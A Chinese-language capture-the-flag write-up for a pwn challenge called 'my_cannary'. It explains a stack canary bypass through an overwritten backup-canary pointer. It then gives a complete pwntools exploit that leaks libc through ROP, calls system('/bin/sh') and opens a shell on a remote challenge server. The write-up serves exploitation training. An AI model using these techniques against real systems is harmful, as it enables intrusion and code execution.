此题的解决流程包括：绕过canary+ROP获得shell

这道题直接ida发现`judge`函数无法反编译，所以使用`objdump -d my_cannary > asm.s`命令，直接看的汇编。可以发现整体的逻辑，在main函数中调用welcome函数生成随机数作为canary，而后调用test函数将随机数传入，存储在了`ebp-0x8`处，分配了一个空间备份了一下canary，将此空间的地址存储在ebp-0x10处，然后调用了read函数，这里存在溢出点。test函数的最后调用check函数，检查canary是否损坏。

在welcome函数中，可以发现一个gift变量，此为一个未初始化的全局变量。

### 绕过canary

将ebp-0x10处的地址改为gift全局变量的地址，ebp-0x8处覆盖为0。

### ROP获得shell

将puts函数的真实地址输出，再使用libcsearcher库，获取system函数地址和/bin/sh的地址。

exp.py

```python
from pwn import *
from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")
io = process("./my_cannary")
io = remote("172.21.4.12", 10102)
elf = ELF("./my_cannary")

# f = open("inputfile", "wb")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
system_plt = elf.plt['system']

popret = 0x400a43
mainaddr = 0x400998

payload1 = 'a' * 0x30 + p64(0x6010C0) + p64(0x0) + p64(0x0) + p64(popret) + p64(puts_got) + p64(puts_plt) + p64(mainaddr)

io.recvuntil("begin\n")
io.sendline(payload1)
puts_addr = u64(io.recv(6).ljust(8, '\x00'))
# print(hex(puts_addr))

libc = LibcSearcher("puts", puts_addr)
libcbase = puts_addr - libc.dump("puts")
binsh_addr = libcbase + libc.dump("str_bin_sh")
system_addr = libcbase + libc.dump("system")

payload2 = 'a' * 0x30 + p64(0x6010C0) + p64(0x0) + p64(0x0) + p64(popret) + p64(binsh_addr) + p64(system_addr)

io.recvuntil("begin\n")
io.sendline(payload2)
io.interactive()
```



